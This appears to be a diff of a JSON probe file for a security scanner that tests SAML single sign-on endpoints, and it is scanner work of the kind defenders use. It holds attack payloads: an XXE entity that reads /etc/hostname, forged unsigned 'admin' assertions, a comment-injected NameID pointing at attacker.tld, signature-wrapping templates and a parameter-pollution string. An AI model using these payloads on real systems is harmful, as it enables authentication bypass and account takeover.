@@ -3,15 +3,41 @@
   "contexts": {
     "signature_bypass": {
       "description": "SAML signature validation bypass -- remove or manipulate XML signature to forge assertions",
-      "tech_match": ["SAML", "SSO", "Okta", "ADFS", "Shibboleth", "OneLogin", "SimpleSAMLphp"],
-      "param_match": ["SAMLResponse", "SAMLRequest", "RelayState"],
+      "tech_match": [
+        "SAML",
+        "SSO",
+        "Okta",
+        "ADFS",
+        "Shibboleth",
+        "OneLogin",
+        "SimpleSAMLphp"
+      ],
+      "param_match": [
+        "SAMLResponse",
+        "SAMLRequest",
+        "RelayState"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "Remove Signature element from SAML response -- if SP accepts unsigned assertion, any attribute can be forged",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "not_word", "words": ["signature", "invalid signature", "verification failed", "not signed"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "signature",
+                "invalid signature",
+                "verification failed",
+                "not signed"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70
@@ -20,8 +46,21 @@
           "payload": "{{baseline}}",
           "description": "Move Signature to different element -- sign a non-critical element while leaving assertion unsigned",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "not_word", "words": ["signature", "invalid", "verification"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "signature",
+                "invalid",
+                "verification"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 65
@@ -30,15 +69,38 @@
     },
     "xxe_in_saml": {
       "description": "XXE injection via SAML XML -- inject external entity in SAMLResponse/SAMLRequest XML payload",
-      "tech_match": ["SAML", "SSO", "Java", "PHP", ".NET"],
-      "param_match": ["SAMLResponse", "SAMLRequest"],
+      "tech_match": [
+        "SAML",
+        "SSO",
+        "Java",
+        "PHP",
+        ".NET"
+      ],
+      "param_match": [
+        "SAMLResponse",
+        "SAMLRequest"
+      ],
       "probes": [
         {
           "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><samlp:Response>&xxe;</samlp:Response>",
           "description": "External entity injection in SAML response -- if XML parser resolves entities, file read is possible",
           "matchers": [
-            {"type": "not_word", "words": ["xml parsing", "entity", "dtd not allowed"]},
-            {"type": "status", "status": [200, 400, 500]}
+            {
+              "type": "not_word",
+              "words": [
+                "xml parsing",
+                "entity",
+                "dtd not allowed"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                400,
+                500
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60
@@ -47,15 +109,34 @@
     },
     "assertion_replay": {
       "description": "SAML assertion replay -- reuse a valid assertion after expiry or for a different session",
-      "tech_match": ["SAML", "SSO"],
-      "param_match": ["SAMLResponse"],
+      "tech_match": [
+        "SAML",
+        "SSO"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "Replay captured SAMLResponse after session ends -- if accepted, assertion replay allows session hijacking",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "not_word", "words": ["expired", "replay", "already consumed", "invalid"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "expired",
+                "replay",
+                "already consumed",
+                "invalid"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -64,15 +145,35 @@
     },
     "attribute_injection": {
       "description": "SAML attribute injection -- inject additional attributes (role, email, group) into assertion to escalate privileges",
-      "tech_match": ["SAML", "SSO"],
-      "param_match": ["SAMLResponse"],
+      "tech_match": [
+        "SAML",
+        "SSO"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "Add admin role attribute to SAML assertion -- if SP trusts all assertion attributes without validation, privilege escalation occurs",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "word", "words": ["admin", "dashboard", "settings", "management"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "admin",
+                "dashboard",
+                "settings",
+                "management"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 55
@@ -81,15 +182,34 @@
     },
     "recipient_mismatch": {
       "description": "SAML recipient/audience validation bypass -- assertion intended for one SP accepted by another",
-      "tech_match": ["SAML", "SSO"],
-      "param_match": ["SAMLResponse"],
+      "tech_match": [
+        "SAML",
+        "SSO"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "Submit assertion from SP-A to SP-B -- if recipient/audience not validated, cross-SP impersonation is possible",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "not_word", "words": ["audience", "recipient", "invalid", "mismatch"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "audience",
+                "recipient",
+                "invalid",
+                "mismatch"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 45
@@ -98,15 +218,32 @@
     },
     "xml_signature_wrapping": {
       "description": "XSW (XML Signature Wrapping) -- valid signature covers original assertion, but attacker injects a SECOND assertion that the application processes. Distinct from generic 'signature bypass' because the signature IS valid; the parser is tricked into reading a different element. Eight named XSW variants per XSW research.",
-      "tech_match": ["SAML", "SSO"],
-      "param_match": ["SAMLResponse"],
+      "tech_match": [
+        "SAML",
+        "SSO"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "[Manual] XSW1: wrap a SECOND <Assertion> around the original signed <Response>. Signature still validates (over original), but app reads outer assertion attributes (role=admin).",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "word", "any": ["admin", "dashboard"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "admin",
+                "dashboard"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 65
@@ -115,8 +252,20 @@
           "payload": "{{baseline}}",
           "description": "[Manual] XSW2: same as XSW1 but evil assertion is sibling of the original signed assertion. App may pick first <Assertion> by XPath while signature validates the second.",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "word", "any": ["admin", "dashboard"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "admin",
+                "dashboard"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 65
@@ -125,8 +274,20 @@
           "payload": "{{baseline}}",
           "description": "[Manual] XSW3-8: vary placement of signed/evil assertion (wrap signature in evil, evil after signed Response, evil with same ID after copy of signed, etc.). Run all 8 variants automated by SAMLRaider/Same-Origin Method.",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "word", "any": ["admin", "dashboard"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "admin",
+                "dashboard"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60
@@ -135,15 +296,32 @@
     },
     "audience_attribute_reuse": {
       "description": "Audience attribute reuse -- distinct from recipient_mismatch. Some SPs only validate <Recipient> (URL) but ignore <Audience> attribute. Same assertion accepted by SP-B if Recipient happens to match (e.g. wildcard SAML config).",
-      "tech_match": ["SAML", "SSO"],
-      "param_match": ["SAMLResponse"],
+      "tech_match": [
+        "SAML",
+        "SSO"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "[Manual] Use SP-A's Recipient (matching SP-B's ACS URL via misconfig) but SP-A's Audience. If SP-B accepts: cross-SP token reuse with no Recipient bypass needed.",
           "matchers": [
-            {"type": "status", "status": [200, 302]},
-            {"type": "not_word", "words": ["audience", "invalid"]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "audience",
+                "invalid"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -152,7 +330,13 @@
           "payload": "{{baseline}}",
           "description": "[Manual] Multi-Audience assertion -- legitimate SP issues assertion with two <Audience> values (rare misconfig). Both SPs accept the same assertion concurrently.",
           "matchers": [
-            {"type": "status", "status": [200, 302]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 45
@@ -161,17 +345,211 @@
     },
     "saml_request_smuggling": {
       "description": "SAML request smuggling -- inject second SAMLRequest in same HTTP request via parameter pollution. Some SPs use first, IdP uses last (or vice versa).",
-      "tech_match": ["SAML", "SSO"],
-      "param_match": ["SAMLRequest"],
+      "tech_match": [
+        "SAML",
+        "SSO"
+      ],
+      "param_match": [
+        "SAMLRequest"
+      ],
       "probes": [
         {
           "payload": "valid_request&SAMLRequest=attacker_request",
           "description": "[Manual] HPP attack on SAMLRequest. Worth testing if HPP works elsewhere on the same SP.",
           "matchers": [
-            {"type": "status", "status": [200, 302]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            }
           ],
           "severity": "medium",
           "confidence_boost": 30
+        }
+      ]
+    },
+    "saml_response_endpoint_detect": {
+      "description": "ACS (Assertion Consumer Service) endpoints \u2014 POST body has SAMLResponse base64 parameter; or query SAMLResponse=. Confirms target consumes SAML.",
+      "tech_match": [
+        "saml",
+        "shibboleth",
+        "okta",
+        "onelogin",
+        "adfs",
+        "auth0",
+        "ping"
+      ],
+      "param_match": [
+        "SAMLResponse",
+        "samlResponse",
+        "RelayState"
+      ],
+      "probes": [
+        {
+          "payload": "",
+          "description": "ACS endpoint fingerprint",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SAMLResponse",
+                "samlp:Response",
+                "saml2:Assertion",
+                "ds:Signature"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header",
+              "header": "location",
+              "weight": 30
+            }
+          ],
+          "severity": "low",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    },
+    "xsw_signature_wrap": {
+      "description": "XSW1/2: wrap original signed Assertion inside attacker-injected Assertion. If processor reads attacker's Assertion but validates original Assertion's signature, auth bypass.",
+      "tech_match": [
+        "saml"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
+      "probes": [
+        {
+          "payload": "BASE64(<samlp:Response><saml:Assertion ID=\"attacker\"><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion ID=\"original\" Signature=\"valid\">...</saml:Assertion></samlp:Response>)",
+          "description": "Wrapped-signature attack \u2014 operator builds the actual payload via SAML Raider / python3 -c with original captured response. Server logs admin login = vuln.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header_change",
+              "header": "set-cookie"
+            },
+            {
+              "type": "word",
+              "words": [
+                "admin",
+                "Welcome"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "xsw_comment_injection_nameid": {
+      "description": "Comment-injection in NameID. Parser canonicalises before signature check; canonicalisation strips XML comments, so 'admin<!---->@evil.com' validates as 'admin' but app reads 'admin@evil.com'.",
+      "tech_match": [
+        "saml"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
+      "probes": [
+        {
+          "payload": "BASE64(<saml:NameID>victim<!---->@attacker.tld</saml:NameID>)",
+          "description": "Inject HTML comment in NameID \u2014 operator builds via raider",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "word",
+              "words": [
+                "victim",
+                "session"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "saml_signature_exclusion": {
+      "description": "Send unsigned Assertion (no ds:Signature). Vulnerable processors accept assertions without verifying signatures were present.",
+      "tech_match": [
+        "saml"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
+      "probes": [
+        {
+          "payload": "BASE64(<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>)",
+          "description": "Signature-exclusion \u2014 assertion contains no ds:Signature element. Operator builds.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header_change",
+              "header": "set-cookie"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        }
+      ]
+    },
+    "saml_keyinfo_swap": {
+      "description": "KeyInfo manipulation \u2014 replace IdP cert in <ds:KeyInfo> with attacker key, re-sign whole assertion. Vulnerable verifier trusts embedded KeyInfo rather than out-of-band cert.",
+      "tech_match": [
+        "saml"
+      ],
+      "param_match": [
+        "SAMLResponse"
+      ],
+      "probes": [
+        {
+          "payload": "BASE64(...full attacker-signed assertion with attacker KeyInfo X509Certificate...)",
+          "description": "Operator builds with python3 + lxml + xmlsec",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header_change",
+              "header": "set-cookie"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
         }
       ]
     }
